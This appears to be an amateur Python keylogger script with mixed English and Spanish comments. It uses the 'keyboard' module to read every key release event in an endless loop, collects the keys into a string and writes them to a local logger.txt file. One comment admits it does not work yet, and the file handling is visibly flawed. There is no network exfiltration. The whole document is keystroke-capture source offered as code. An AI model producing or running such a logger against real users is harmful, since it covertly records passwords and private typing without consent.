#import the module
import keyboard as key

#we have to create a varible to nest all the keys, it'll start as a empty strings
teclas = ""
logger = []
#now we need a loop in which all the envents of the keyboard will happen
while True:
    Recorded = str(key.read_event())
    if Recorded.__contains__('up'):
        Recorded = Recorded.replace('KeyboardEvent(','')
        Recorded = Recorded.replace('up)','')
        if (len(Recorded)>1):
            teclas = teclas + " " + Recorded + " "
        else:
           teclas = teclas + Recorded 
    print(teclas)
    #aun no funciona
    try:
        with open("logger.txt", "r+") as logger:
            logger.write(str(teclas))
            print("keys logged")
    except Exception as error:
        print("Error:",format(error))
            

    
